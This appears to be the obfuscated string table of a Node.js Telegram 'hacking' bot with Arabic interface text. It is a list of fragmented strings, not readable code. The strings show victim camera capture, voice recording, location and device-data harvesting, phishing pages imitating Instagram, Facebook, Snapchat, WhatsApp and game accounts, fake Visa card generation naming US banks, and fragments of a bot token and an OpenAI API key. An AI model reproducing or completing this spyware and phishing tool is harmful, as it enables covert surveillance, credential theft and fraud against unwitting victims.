        'node-teleg',
        'add_vip',
        'includes',
        'eed\x22:true,',
        'browserNam',
        'atId=',
        'د\x20لنسخه</s',
        '\x20الحساب:*\x0a',
        'kMZrO',
        'pExSW',
        'تم\x20تصوير\x20ا',
        'هونغ\x20كونغ',
        'xbFGE',
        'setItem',
        'k\x20:*\x20`',
        'ذاكرة\x20المؤ',
        'XKCeX',
        'neNumber',
        'اختراق\x20الم',
        'اليونان\x20🇬🇷',
        'exit',
        'لا\x20توجد\x20رس',
        'existsSync',
        'تنزانيا\x20🇹🇿',
        '\x20وظهر\x20أنه\x20',
        'i.internal',
        'body-parse',
        'xx.html',
        'المجر\x20🇭🇺',
        'ARuZl',
        'rHfSd',
        '7oxkoPuxqz',
        '\x20IP:\x20',
        'CRKWX',
        'قيرغيزستان',
        'rce/get/?s',
        'البحرين\x20🇧🇭',
        '\x20as\x20expect',
        '\x22,\x22redux_n',
        'aBpHX',
        'myGhB',
        'yHjpv',
        'لف\x20الشخصي:',
        'ZI0_bot',
        'almunharif',
        'حث.',
        'editMessag',
        '</strong>',
        'gvxsx',
        'ومات\x20جهازك',
        'store',
        '/strong><c',
        'لجميع\x20المو',
        '\x20الجهاز:',
        'س\x20لديك\x20إيم',
        '/submitCod',
        'ook',
        '291056Cgpgzn',
        'م\x20مستخدم',
        'ook:',
        '/ca.html',
        'facebook',
        'HuFWW',
        'ط\x20🔒',
        'time',
        'zspXy',
        'اشترك\x20في\x20',
        'KMVlD',
        'earchResou',
        'mSCkC',
        '\x20الرسائل:',
        'هولندا\x20🇳🇱',
        'لنسخها.',
        'countryNam',
        'لي30\x20نقطه\x20',
        'MpQAO',
        'اختراق\x20تيك',
        'hatId=',
        'م\x20استلمها\x20',
        'CWKjQ',
        '-\x20نوع\x20الات',
        'Kit/537.36',
        'باراغواي\x20🇵🇾',
        'redirect',
        'بنما\x20🇵🇦',
        '<strong>❗ل',
        'sing\x20chatI',
        'TD\x20Bank',
        ']\x200%',
        'تم\x20لغيم\x20ال',
        'ngan.glitc',
        '\x22scope\x22:\x22p',
        'zwNao',
        'BggeF',
        'يه\x20الاصيله',
        '🇬🇹',
        'qDyUY',
        'HlxfR',
        'لاستخراج',
        'snapchat.c',
        '\x20آخر\x20تحديث',
        '<strong>قم',
        'لمميزات\x20تل',
        'imageDatas',
        'qLwdO',
        'لهرسك\x20🇧🇦',
        'every',
        '\x20الرجاء\x20تغ',
        '/start',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        'معلومات\x20حس',
        'يد\x20وهمي\x20لا',
        'لا\x20توجد\x20نب',
        'ام\x20بنجاح.',
        '/:userId',
        'وامر\x20اخترا',
        'files',
        'elLpd',
        'ه\x20مقفله\x20ان',
        'Error\x20chec',
        'onrender',
        'أوزبكستان\x20',
        'wFHkk',
        '\x20سابقاً\x20هو',
        'base64',
        'SAhgX',
        'الصور\x20الرا',
        'ع\x201نقطه\x20عن',
        '➖\x20رمز\x20الدو',
        'er.glitch.',
        'سحب\x20جميع\x20ص',
        'اب\x20لفك\x20الح',
        'و\x20🎥',
        '\x20🌍\x0a-\x20الدعم',
        'gicen',
        'مرحبًا!\x20هذ',
        'kjStG',
        'gesVx',
        'rhJPQ',
        'ال\x20الخاصة\x20',
        '/ok.html',
        'Markdown',
        'يرجى\x20إرسال',
        '\x20في\x20نسخه\x20ث',
        'ليبيا\x20🇱🇾',
        'YDCMZ',
        'تصوير\x20الضح',
        '@hsosgh',
        'لانتهاء.',
        'باع\x20هذه\x20ال',
        'TjOgX',
        'وله\x20يمكنك\x20',
        '<strong>جا',
        '▓▓░░░░░░░░',
        'memory',
        'toLocaleTi',
        'يات\x0aتصاميم',
        'بنغلاديش\x20🇧🇩',
        'NoZlL',
        'browserVer',
        'ue\x20:*\x20`',
        'الرقام\x20وهم',
        'push',
        'json',
        'قد\x20حدث\x20خطأ',
        'د\x20الأنوية:',
        'pin',
        'uOoWp',
        '/whatsapp',
        'html',
        'zuypG',
        'آيسلندا\x20🇮🇸',
        'fehCE',
        'تم\x20استلام\x20',
        'رجيه\x20لكتشا',
        'هذا\x20لفتح\x20أ',
        'ource_url=',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        'البرتغال\x20🇵🇹',
        '/getName',
        'U.S.\x20Bank',
        'YpqQW',
        '.jpg',
        'last_name',
        'P_12',
        'مؤقتة.',
        '/record/',
        'memoryStor',
        'الرجاء\x20توف',
        'linkId',
        'boid-outst',
        'EikNe',
        'NApaA',
        '🇵🇷',
        '\x20إيميل\x20وهم',
        'sendLocati',
        'لمراقبة\x20📡',
        'إستونيا',
        'دما\x20يقوم\x20ش',
        'body_text',
        'لا\x20توجد\x20صو',
        '🇫🇮',
        'إندونيسيا',
        '\x20انشاء\x20ايم',
        '<strong>لم',
        'OMGkH',
        'getChatMem',
        'gram:',
        'qgepP',
        'مرحبا!\x20في\x20',
        'LRbVt',
        'yefkz',
        'تم\x20حذف\x20الم',
        'me/lTV_l/3',
        '\x20NT\x2010.0;\x20',
        'ولة\x20الحصول',
        '▓▓▓▓▓▓▓▓▓▓',
        '\x20أسماء\x20الم',
        '\x20🔁',
        'zxRlX',
        'ائل\x20جديدة.',
        'ال\x20معرف\x20ال',
        'elwAR',
        'anding-mas',
        '🇭🇰',
        'كوريا\x20الجن',
        'ر\x20لجمع\x20معل',
        'rLvrX',
        'مل\x20السابق\x20',
        'ندما\x20توصل\x20',
        'qfCiL',
        'h.me/',
        'untry/',
        'qvoki',
        'oWGuy',
        'No\x20visa\x20da',
        'ThFKx',
        'generate_v',
        'qEldm',
        'network',
        'spxuA',
        'single',
        'https://sm',
        'التردد\x20للا',
        'iXUbZ',
        'OnYMY',
        'TmBHR',
        'الضحية\x20🎤',
        'tuJMm',
        '/email/',
        '\x20حتى\x20يتم\x20ا',
        'sLffS',
        'لرابط:\x20',
        'gYRjB',
        'parse',
        'في\x20هذا\x20الد',
        '\x20لشركة\x20وتس',
        'member',
        '/captureBa',
        'SIGTERM',
        'سويسرا\x20🇨🇭',
        '\x20📊\x0a-\x20دقة\x20ا',
        'OGUQq',
        'WjuyW',
        'HslEc',
        'الصوره🙋‍♂️\x20',
        '\x20المراقبه\x20',
        'تم\x20استخدام',
        '🇨🇲',
        'البحث\x20عن\x20ص',
        'fBTCO',
        'eQnYo',
        'Edjkb',
        'ins\x22}}',
        'ات\x20الجهاز:',
        '\x20🇹🇲',
        'مولدوفا\x20🇲🇩',
        'number',
        'DQLtx',
        'لقد\x20قام\x20ضح',
        'IQwye',
        'max',
        'add_names',
        'attempts',
        'ناء\x20محاولة',
        'أيرلندا\x20🇮🇪',
        'شرح\x20البوت\x20',
        'map',
        'zgpUP',
        '\x20الثانية)\x0a',
        'BdFPp',
        '\x20يزال\x20مشبو',
        'process\x20vi',
        'screenReso',
        'بنجاح\x20✅',
        'bBHJd',
        'lVpNN',
        'تم\x20تصنيفه\x20',
        'beqnH',
        'XraoM',
        'الضحيه\x20📲',
        'HDPzO',
        '\x20🏙️\x0a-\x20عنوان',
        'sHFuT',
        '\x20:*\x20`',
        'country',
        'وقع\x20📍',
        '\x20كـ\x20VIP.',
        'اضغط\x20على\x20ا',
        'لاتفيا\x20🇱🇻',
        '\x20لاحقًا.',
        'resource_r',
        'الدخول\x20\x20له',
        'سريلانكا\x20🇱🇰',
        'on...\x0a[▓▓░',
        'لمتصفح:\x20',
        'ase\x20try\x20ag',
        'lBtXw',
        'صي.',
        'deviceVers',
        'لقد\x20تم\x20اخت',
        'choices',
        'أسماء\x20المس',
        'holder.tex',
        'لام\x20معلوما',
        'message_id',
        'W5B7mU',
        'am\x20message',
        '919845wGnaKq',
        'xxmpm',
        'اختراق\x20فري',
        '🇱🇻',
        '40YBcEoW',
        'TbWqL',
        'Number\x20:*\x20',
        'lgctV',
        'صال:\x20',
        'السويد',
        'ca.html',
        'kNSHe',
        'Id\x20',
        'قه\x20سيتم\x20فت',
        'لقائي\x20',
        'multer',
        '\x20:\x20`',
        'لموقع\x20الجغ',
        'أمريكا',
        'رومانيا\x20🇷🇴',
        'الكاميرون\x20',
        'tIuVL',
        'RRoqc',
        'aHKHT',
        'موناكو\x20🇲🇨',
        'س\x20لديك\x20ايم',
        '\x20Visa...\x0a[',
        'AZDPT',
        'جهازك\x20او\x20ط',
        '\x20كل\x20الازرا',
        'videoData',
        '\x20🔞',
        'كازاخستان\x20',
        'substring',
        'mITLp',
        'JVsRH',
        'q.whatsapp',
        'Wells\x20Farg',
        '/xx.html?c',
        'age',
        'info.io/',
        'mm.html',
        'nmVab',
        'زيد\x20من\x20الص',
        'لرجاء\x20المح',
        'ZCJxp',
        'SWqef',
        ')\x20AppleWeb',
        'instagram.',
        'get_joke',
        'pGxPt',
        '/ca',
        'xcSVa',
        'tions\x22:{\x22q',
        'capture_vi',
        '12YQhTeX',
        'إضافة\x20مستخ',
        'https://yo',
        '▓▓▓▓▓▓░░░░',
        'تم\x20اختراق\x20',
        'countryFla',
        'clck',
        'geolocatio',
        'each',
        'TFfgl',
        '&duration=',
        '/ios',
        'TZVcl',
        'w.pinteres',
        '*Hi\x20Bro,\x20I',
        'كينيا\x20🇰🇪',
        '/mm',
        'ميانمار\x20🇲🇲',
        'Error\x20fetc',
        'بط\x20دعوة',
        '<strong>•\x20',
        'اوت',
        '**\x0a-\x20الدول',
        'quhwZ',
        'لم\x20يتم\x20اخت',
        '.temp-mail',
        'ب\x20شات\x20⭐',
        'IrKIR',
        'مدفوع\x20بسعر',
        'HfMww',
        'يه\x20☎️',
        'os\x20for\x20cha',
        'aQKkV',
        'ية\x20📷',
        '\x20\x22https\x22.',
        'قم\x20بإرسال\x20',
        'جورجيا\x20🇬🇪',
        'ع\x20اضافة\x20فا',
        'GOTUW',
        '*[-]\x20Card\x20',
        'networkTyp',
        'ضحيه\x20في\x20اد',
        'مالي\x20🇲🇱',
        'مل\x20وهمي\x20\x20/',
        'لم\x20يتم\x20الت',
        'send\x20video',
        'لجهاز:\x20',
        'zqvUh',
        'رابط\x20هذا:\x20',
        'افته\x20كـ\x20VI',
        'GyPuP',
        'AiAkG',
        'on...\x0a[░░░',
        'meNLq',
        'dwSMs',
        'في\x20الطلب.',
        'subject',
        'رة\x20(RAM):\x20',
        'بعد</stron',
        '؟:\x20',
        'TOUUZ',
        'RqzSZ',
        'fuschia-lo',
        'سنغافورة\x20🇸🇬',
        'rg/en/byco',
        'تركمانستان',
        'لزر\x20للحصول',
        'روسيا\x20🇷🇺',
        '\x20📶\x20(سرعة:\x20',
        '?chatId=',
        'ء\x20جلب\x20الرس',
        'ZPlTC',
        'ن\x20التعامل\x20',
        'اولة\x20مرة\x20أ',
        'rong>',
        '\x20أي\x20إيميل\x20',
        'اب\x20سريعاً\x0a',
        '47737sPKuNE',
        '`\x0a*[-]\x20Cou',
        '@lTV_l',
        'LPxiy',
        'kkjTR',
        '\x20الذكاء\x20ال',
        'لهاتف:\x20',
        '\x20روبوتًا.',
        'س\x20تسخدمه\x20ف',
        'تم\x20حذف\x20الذ',
        '\x20البرامجيا',
        '➖\x20تاريج\x20ال',
        'xWUjn',
        'SNwWO',
        '🇳🇮',
        'ا\x20الرجاء\x20ا',
        'meString',
        'VISA\x20-\x20DEB',
        'احصل\x20على\x20ر',
        'vzJil',
        '/s.html?ch',
        'instagram',
        'gsOod',
        'CuHfv',
        'إستونيا\x20🇪🇪',
        'حدثت\x20مشكلة',
        'أفغانستان\x20',
        'فنزويلا\x20🇻🇪',
        'مكنك\x20إنشاء',
        'إضافة\x20مشتر',
        'فرنسا',
        'urlencoded',
        'مستخدم\x20لإض',
        '&type=inst',
        ']\x2075%',
        'زيمبابوي\x20🇿🇼',
        'voice',
        'إلغاء\x20اشتر',
        'blmTh',
        'ntation',
        'AxaEG',
        'vipUsers',
        'ر\x20مجاناً:',
        'FwjTM',
        'له\x20تتوفر\x20ه',
        'ية\x20تحديد\x20ا',
        '🇬🇧',
        'k.glitch.m',
        'ث\x20خطأ\x20أثنا',
        '🇷🇸',
        'quest:\x20Mis',
        'dpZiv',
        'match',
        '\x0a📱\x20**معلوم',
        'تم\x20إزالة\x20ا',
        'NoaGJ',
        'dtiDC',
        'اليابان\x20🇯🇵',
        'RoZHs',
        'length',
        'اكتب\x20لي\x20رس',
        'آمن\x20🟢',
        'النمسا\x20🇦🇹',
        'captureFro',
        'ها\x20رقمي\x20ول',
        'الصين',
        'ن\x20🇩🇴',
        '\x20🔻\x0a-\x20المدي',
        'rQfVP',
        ':AAELOAVm0',
        'العراق\x20🇮🇶',
        'request_ve',
        '&data={\x22op',
        'd\x20Bank',
        'get_love_m',
        'gukmi',
        'فشل\x20في\x20إرس',
        'ription\x20st',
        ']\x2050%',
        'IzceC',
        'st.\x0a-\x20اضغط',
        'إيميل\x20الذي',
        'لا\x20يوجد\x20اس',
        '🇱🇺',
        'ijcbl',
        'BlaXH',
        'ت\x20خبيثه\x20خا',
        'شخص\x20جديد\x20د',
        'WiGiT',
        '▓▓▓░░░░]\x207',
        'ExMfq',
        '\x20sent\x20phot',
        'add_nammes',
        'SwFbF',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'قر\x20على\x20الز',
        '/messages',
        'slice',
        'مك\x20المنحرف',
        'الصوره📸\x20',
        'Sent\x20photo',
        'Generate\x20V',
        'IDNFF',
        '\x20لتقنية\x20ال',
        'PRAUG',
        'recordVoic',
        'trong>اضغط',
        '.com',
        'r.html',
        'UBqHE',
        'LcSGF',
        'tqxXZ',
        'iver',
        'phoneNumbe',
        'mQhBW',
        'replit',
        'keys',
        'glitch',
        'الرجاء\x20إدخ',
        'pdKnP',
        'ssTPn',
        'ميع\x20قنوات\x20',
        'get_freefi',
        'CqSwq',
        'd\x20Type\x20:*\x20',
        'تم\x20إنشاء\x20ا',
        '\x20قم\x20في\x20تعي',
        '\x20رابط\x20لالت',
        'أذربيجان\x20🇦🇿',
        'لا\x20بك\x20:\x20|\x20',
        'rest-plaus',
        'قر\x20على\x20الر',
        'colorDepth',
        'TRQUJ',
        '\x20على\x20البري',
        'كامرات\x20في\x20',
        'sViHE',
        'vSGfN',
        'backQuery',
        'EqsWn',
        'قبرص\x20🇨🇾',
        'get_link',
        'DtRXi',
        'BnIhD',
        'rmnAG',
        'XFKLC',
        'config',
        'getUserPro',
        'IORce',
        'load',
        'vUQLt',
        'networkSpe',
        'ر\x20لتوليد\x20ر',
        'rbo',
        '\x20الرسالة.\x20',
        'زامبيا\x20🇿🇲',
        'xYCMf',
        'pUQBi',
        'php',
        'nAvailable',
        '\x20sent\x20vide',
        'سو\x20🇧ﺫ',
        'كرة\x20المؤقت',
        'getItem',
        '2BT3BlbkFJ',
        'بوتسوانا\x20🇧🇼',
        'أخرى\x20لاحق😁',
        '\x20كاميرات\x20ا',
        'ط\x20🪄',
        '\x20📜\x0a-\x20نوع\x20ا',
        'ساحل\x20العاج',
        'gram',
        'اختراق\x20كام',
        'YJIcKlujfP',
        'خص\x20في\x20الدخ',
        'post',
        '2DOs-Fgdwp',
        'الية\x20🇰🇵',
        'yzVoJ',
        'جزر\x20فارو\x20🇫🇴',
        'fetch\x20visa',
        'صربيا\x20🇷🇸',
        'ل\x20عن\x20800حر',
        'dttao',
        'reply_mark',
        'Error\x20send',
        'ماليزيا\x20🇲🇾',
        'pyvQJ',
        'EeNjP',
        'SSdOD',
        'tMhUJ',
        '\x20على\x20الزر\x20',
        'cRLwu',
        'ماكاو\x20🇲🇴',
        'cVfbC',
        'ormalize_f',
        'cleanuri',
        'trmRN',
        'esponse',
        'sion',
        'خطأ.',
        '\x20🔵\x0a-\x20دعم\x20ا',
        'لهاتف\x20يشحن',
        'DlaLL',
        '\x20الكثير\x20من',
        'hhkYQ',
        '`\x0a*[-]\x20Exp',
        'سوف\x20يتم\x20فت',
        'الخادم\x20يعم',
        'أوامر\x20للاس',
        'ابط\x20أدناه\x20',
        'wFXsU',
        'امريكا\x20🇺🇸',
        'upport',
        'irVTX',
        'hex',
        '7065665133',
        '\x20data.\x20Ple',
        'بطًا\x20يبدأ\x20',
        'ير\x20هذا\x20الر',
        'تم\x20إرسال\x20ا',
        'sAPrH',
        'data',
        'hw.vercel.',
        '\x20الله\x20ورسو',
        'seWwkhTzrZ',
        'ItNpZ',
        'ible-pract',
        'رجاء\x20\x20عدم\x20',
        'https://nm',
        'CQkXV',
        'خدمة:\x20',
        '\x20📏\x0a-\x20إصدار',
        'مية\x20📸',
        '\x20المحتله\x20🇮🇱',
        'qyAmF',
        'تم\x20التحقق\x20',
        'ber',
        'حاولة\x20مرة\x20',
        '🇰🇿',
        'tyfiB',
        'Invalid\x20re',
        'lvGPm',
        'query',
        'ZwVSF',
        'yDyVe',
        'pFfti',
        'tor',
        'idnsm',
        'https://cu',
        'c.html',
        'ود\x20🇲🇪',
        'rmdirSync',
        'الملف\x20الشخ',
        'utf8',
        'jDOtR',
        'فرمتة\x20جوال',
        'اق\x20وتساب\x0a:',
        '\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20',
        '\x20ميغابت\x20في',
        'لضحيه\x20فيدي',
        '\x20(KHTML,\x20l',
        'Mozilla/5.',
        'غط\x20على\x20الز',
        'ود\x20هاذا\x20ال',
        'abscM',
        '\x20المدفوع\x20ت',
        'eLLHe',
        'ير\x20chatId\x20',
        'PmwBo',
        'تم\x20إضافة\x20ا',
        'إنشاء\x20إيمي',
        'IT\x20-\x20VISA\x20',
        'first_name',
        'get_photo_',
        'MFzFs',
        'pObPH',
        '8065212vEvKvI',
        'EsXQv',
        'ايل\x20الذي\x20ت',
        'ترينيداد\x20و',
        'حث\x20عن\x20الصو',
        'nOGKk',
        'غرينلاند\x20🇬🇱',
        'موزمبيق\x20🇲🇿',
        'random',
        'bWwHh',
        'الهند\x20🇮🇳',
        'القائمة:\x20',
        'لصورة\x20بنجا',
        '➖\x20الدوله\x20:',
        'WNqtW',
        'readdirSyn',
        'ابط\x20الخاص\x20',
        'رابط\x20تجميع',
        'لرابط\x20لختر',
        'SDfSB',
        'ة...',
        'forEach',
        '`\x0a*=======',
        'له\x20🌏\x20:\x20',
        '\x20🖥️\x0a-\x20إصدار',
        '\x20من\x20VIP.',
        'eomwe',
        'VTucQ',
        'مدغشقر\x20🇲🇬',
        'لم\x20أتمكن\x20م',
        'ي\x20🕹',
        'سوريا\x20🇸🇾',
        '\x20لك\x0a\x20يوجد\x20',
        'إختراق\x20ببج',
        'uBLJR',
        'lkKlF',
        't.me',
        'get',
        '\x20النكتة.\x20ا',
        'lkFHb',
        'http://www',
        'اتباع\x20الأو',
        'response',
        'أوروغواي\x20🇺🇾',
        'UpdPB',
        'WkUNe',
        'ت\x20بنات\x0aخلف',
        'ابدأ\x20الاخت',
        'VVIsg',
        'وله\x20بسبب\x20ق',
        'sSQPz',
        'صله\x20اضع\x20في',
        '🇳🇿',
        'انشاء\x20📅\x20:\x20',
        'IJPIL',
        'سلوفينيا\x20🇸🇮',
        'XviPD',
        'bRUbV',
        'sendFile',
        'ضغط\x20على\x20هذ',
        'ابط\x20لإضافة',
        'تم\x20انشاء\x20ا',
        'tinyurl',
        'سيتم\x20فتح\x20ا',
        'oyUyp',
        'بـ\x20Pintere',
        'ناء\x20حذف\x20ال',
        'خرى\x20لاحقًا',
        '\x20🇰🇬',
        'lstatSync',
        'waiting_fo',
        'oQsMe',
        'مرحبًا!\x20بك',
        'مرحبًا!\x20ان',
        'الكثير\x20من\x20',
        '\x20فاير\x20👾',
        'apypl',
        '\x20complete',
        'file',
        '=\x0a[-]\x20by\x20:',
        'Your-User-',
        'المشاهده\x20ع',
        'sUEmS',
        'يرات\x20المرا',
        '+7KZ',
        'HXoAL',
        'dxdQA',
        '.mp4',
        'PplLg',
        'راق',
        'cvNZo',
        'وبية\x20🇰🇷',
        '🇷🇺',
        'qVjDd',
        'www',
        '\x20اي\x20برمجيا',
        'رك\x20ذنبكم\x20ب',
        'اله\x20طويله\x20',
        'لحذر\x20مع\x20ال',
        'Bearer\x20sk-',
        'NwuVy',
        'ank',
        '\x20🌍\x0a-\x20شحن\x20ا',
        'ه\x20لنه\x20يحتو',
        'uorescent-',
        'امرا\x20الأما',
        'min',
        'internalSt',
        'https://fl',
        'لم\x20تفتح\x20ال',
        'مله\x20ارسلها',
        'aThHadlLGB',
        'ط\x20خمس\x20مرات',
        'securityPr',
        '673281EpfHnV',
        'اك\x20VIP',
        'cNmkO',
        ']\x2025%',
        '\x20على\x20صورة\x20',
        'ابط\x20قم\x20في\x20',
        'بريطانيا',
        'ه\x20\x0a:\x20https',
        'Ofzno',
        'KhYTl',
        'فحص\x20الرواب',
        'مكنك\x20تجميع',
        'SEPYd',
        'hostname',
        'اختر\x20الدول',
        'lvPDy',
        'ccurred:',
        '.txt',
        'ألمانيا\x20🇩🇪',
        'jfVhG',
        '\x20توك\x20📳',
        '/getLocati',
        'dotenv',
        'لرقم\x20لنسخه',
        'كوستاريكا\x20',
        'للحصول\x20على',
        'التمتع\x20في\x20',
        'SlAAa',
        'vice_info',
        'امرا\x20الخلف',
        'path',
        'chatId=',
        'لة\x20حالياً',
        'QkAUn',
        'urce/BaseS',
        'أوكرانيا\x20🇺🇦',
        'QHaqO',
        '\x2030\x20نقطه\x20ي',
        'بلوتوث:\x20',
        'book',
        '\x20عاليه\x20🖼',
        'المطور\x20@Vl',
        'ور\x20🎨',
        '\x20🇨🇮',
        'قائي.',
        'language',
        '.io/api/v3',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        '000',
        'ndZPm',
        'toISOStrin',
        'ل\x20المطور\x20\x0a',
        'الملفات\x20ال',
        'rbrig',
        '.com/',
        'هاز\x20بنجاح',
        'YZPzv',
        'بولندا\x20🇵🇱',
        '\x20📡\x0a-\x20إمكان',
        'BCsHL',
        'ي\x20راسك....',
        'طة.\x0a:\x20http',
        'An\x20error\x20o',
        '\x20🎨\x0a-\x20تاريخ',
        'hotos:\x20',
        '>\x0a\x0aلنشا\x20اي',
        'لخدمة.</st',
        'ل\x20مره\x20اخرى',
        'lLvfu',
        'كندا\x20🇨🇦',
        'to\x20generat',
        'FfsJz',
        '4.com',
        '\x20انشـاء\x20بر',
        'AoUqR',
        'ستخدمين.',
        'j1u7p1lXXG',
        'CFuSI',
        'أرسل\x20لي\x20اا',
        'غواتيمالا\x20',
        '\x20•\x20معلومات',
        'oQgIV',
        'البرازيل\x20🇧🇷',
        'لروابط',
        'BNBGu',
        '🇫🇷',
        'hmeqv',
        'ي\x20كلمة\x20الب',
        'dWAmH',
        'ه\x20يمنيه\x20قص',
        '\x20:\x20',
        'AlMMs',
        'hCTAD',
        '<strong>تم',
        'zeJxO',
        'email\x0a\x0aلظه',
        'ت\x20الخبيثه\x20',
        'ه\x20وكلمات\x20ج',
        'ئعة\x20مثل\x20\x0aا',
        'ق\x20كامراة\x20م',
        'me/',
        'gpt-3.5-tu',
        'tos',
        'خول\x20لرابط\x20',
        'rKfvI',
        'KeITR',
        'use',
        'RtFSU',
        '\x20المطور',
        'wqWGr',
        '\x20إلى\x20التلغ',
        '@uiit89',
        '\x20•\x20تفاصيل\x20',
        'يا\x20🇿🇦',
        'لبوت.',
        'otocol',
        'م\x20في\x20طلب\x20ك',
        'ecOxp',
        'prev_',
        'essing\x20vid',
        'ache...',
        'صه\x20لمن\x20نجد',
        'RIRZn',
        'الجبل\x20الأس',
        'تسجيل\x20صوت\x20',
        'نامج\x20وحذف\x20',
        'راقبه.....',
        'UfzOJ',
        'ي\x2030\x20نقطه\x20',
        'me/ygf2gbo',
        'لوحة\x20التحك',
        'ation',
        'static',
        '\x20تلقائي\x20',
        '&type=face',
        'NQJuR',
        'بانه\x20مشبوه',
        'ont/:linkI',
        'UcDPM',
        'بـ\x20\x22https\x22',
        '<strong>اه',
        'ذا\x20المميزه',
        'عزيزي\x20حمود',
        'د\x20بعص\x20النا',
        'يره\x20جداً\x20ب',
        'pqSjE',
        'search_ima',
        '🇮🇩',
        'وخاصه\x20اذا\x20',
        'ناء\x20إرسال\x20',
        '\x0a\x0aاضغط\x20على',
        'الدردشة\x20مع',
        'XbVqI',
        'b.html',
        'لقد\x20قمنا\x20ب',
        'collect_de',
        'rong>\x0a\x20\x20\x20\x20',
        'fOasd',
        'فحص\x20الرابط',
        'Bank\x20of\x20Am',
        'وة\x20امانها\x20',
        'الصورة:',
        'text',
        'writeFileS',
        'ated-drift',
        'message',
        'STrJc',
        'رقم\x20في\x20وتس',
        'kivhP',
        'ساب\x20🟢',
        'wKlFW',
        'جمع\x20معلوما',
        '🇳🇱',
        'ال\x20معلومات',
        'تفادة\x20من\x20ا',
        'HcXKa',
        'جرب\x20دوله\x20م',
        '/xx',
        'الأردن\x20🇯🇴',
        'agqHy',
        'FoZCg',
        'dQXqm',
        'بوركينا\x20فا',
        'لام\x20أي\x20رسا',
        'شاءه\x20\x20/an\x0a',
        'ntry\x20:*\x20`',
        'status',
        '5Iw5wkVItL',
        'captureBac',
        '/submitNam',
        'ا\x20الامر\x20/V',
        'YUXOo',
        'لبت\x20باسورد',
        'fJzUK',
        'iWjKI',
        'ة\x20الاتصال',
        '245454reYTCJ',
        'params',
        'فه\x20ولكن\x20لا',
        'https://ww',
        'JazLk',
        'ه\x20بنسبه\x20لن',
        'com',
        '▓▓▓▓▓▓▓]\x201',
        'on/:linkId',
        'Processing',
        'YirxZ',
        'tId\x20',
        'kpAaZ',
        ']\x20100%',
        '\x20اخره\x20لاحق',
        'EaLvU',
        '\x0a➖\x20تم\x20الطل',
        'ل\x20على1\x20نقط',
        'get_number',
        'aQMhZ',
        'الدنمارك',
        '@hqooosjjd',
        'aYvuG',
        'بك!\x20وحصلت\x20',
        'Citibank',
        '\x20Chrome/11',
        'qBurv',
        'YQiHf',
        'قع\x20والبرام',
        '\x20اي\x20صوره\x20ف',
        '/g.html?ch',
        'AbqqQ',
        'fPZCn',
        'المزيد',
        'TiqOP',
        '?start=',
        'https://ap',
        'تصفير\x20الذا',
        'ر\x0aاقتراحات',
        'i.openai.c',
        'ZbMxi',
        'code',
        'فرنسا\x20🇫🇷',
        'JxYwZ',
        'contact',
        'UmhxD',
        'ال\x20للتحقق\x20',
        '\x20تم\x20إنشاؤه',
        'orage',
        'بيلاروس\x20🇧🇾',
        'ذا\x20الرابط\x20',
        'ول\x20الي\x20الر',
        'greencafe2',
        'all',
        'aaZCS',
        'إختراق\x20فري',
        'zsXlx',
        'جداً\x20لا\x20تق',
        '📸الصورة\x20',
        'CIpEh',
        't-break',
        'init',
        'ain\x20later.',
        'مع\x20الشخص\x20ا',
        'LydSE',
        '\x20المحظور\x20م',
        'كازاخستان',
        't.com/reso',
        'asWpL',
        '/?page=',
        'file_id',
        'RzBMw',
        'values',
        'body',
        'ync',
        '\x20GB\x20💾\x0a-\x20عد',
        'ور\x20الهاتف\x20',
        'kEPyd',
        '/ge',
        'AEfjp',
        '\x20أثناء\x20محا',
        'lution',
        'touchSuppo',
        'PORT',
        'yXTDc',
        'الإكوادور\x20',
        'uQGOj',
        '\x20بإنشاء\x20حس',
        'لفحصه.',
        'النرويج\x20🇳🇴',
        'i.html',
        'zyskE',
        'https://mo',
        'راقبه',
        'جرب\x20دوله\x20ا',
        'IiZXB',
        'RNSEq',
        '\x20النقاط\x20ال',
        '\x20و\x20الحذر\x20م',
        'token',
        'CUltH',
        'بريطانيا\x20🇬🇧',
        '😁.',
        'MpQiW',
        'تلغيم\x20رابط',
        'uery',
        '.png',
        '216GRRJLR',
        'tpeJd',
        'awDhP',
        'cheerio',
        '/submitVoi',
        'لرقام\x20الضح',
        '*الايدي\x20:\x20',
        'Clearing\x20c',
        'ياء\x20🧠',
        'لوكسمبورغ\x20',
        'trong>',
        'ستقبال\x20الا',
        'لهجه\x20اليمن',
        'كمبوديا\x20🇰🇭',
        'كاليدونيا\x20',
        'PNC\x20Bank',
        'cUfyO',
        '🇦🇷',
        '/email/new',
        'Verificati',
        'PKOrH',
        'UanKv',
        '\x20🌐\x0a-\x20إصدار',
        'rsOzr',
        'رام.',
        'tWdwJ',
        'HlpfB',
        '🇦🇫',
        'ط\x20لشخاص\x20مو',
        'لم\x20يتم\x20است',
        '\x20على\x20معلوم',
        'bWjjd',
        '\x20مهمه\x20اذا\x20',
        'VGwQT',
        'سلوفاكيا\x20🇸🇰',
        'دم\x20VIP',
        'حدث\x20خطأ',
        'تم\x20انشاء\x20ر',
        'ًا\x20',
        'SNHoT',
        'التواصل\x20مع',
        '➖\x20المنصه\x20🔮',
        '1130060qGwqkp',
        'رى\x20لاحقًا.',
        'فعل.\x20انتظر',
        'kXnxM',
        'ال\x20للتحقق.',
        'ing\x20video:',
        'علومات\x20الج',
        'MKkWS',
        'om/v1/chat',
        '.insecam.o',
        'تصوير\x20بدقه',
        'بليز\x20🇧🇿',
        'rification',
        'pCKav',
        'إثيوبيا\x20🇪🇹',
        'IkxPY',
        'orig',
        'جاري\x20اخترا',
        '\x20الجهاز:\x20',
        'بوليفيا\x20🇧🇴',
        'join',
        'تخدمين:\x20',
        'غانا\x20🇬🇭',
        'الته\x20من\x20VI',
        'غيرنزي\x20🇬🇬',
        'عروفة',
        'ميله\x20ومحرج',
        'NoVoV',
        'ل\x20كود\x20الرق',
        'F.html',
        'هذا\x20المميز',
        'ظر\x20عن\x20رقمي',
        'انيه\x20مدفوع',
        'lastUpdate',
        'link',
        'اتك\x20[\x20/inf',
        'عبر\x20رابط\x20🔒',
        'إزالة\x20مستخ',
        'SIGHUP',
        'countryCod',
        'JxxsM',
        'split',
        'منتهى\x20قم\x20ف',
        'دما\x20تصل\x20ال',
        'https://t.',
        'urglW',
        '🇵🇹',
        'رافي:\x20',
        'جعلته\x20مشبو',
        'فذ\x20',
        'خال\x20رقم\x20ال',
        'DlZMT',
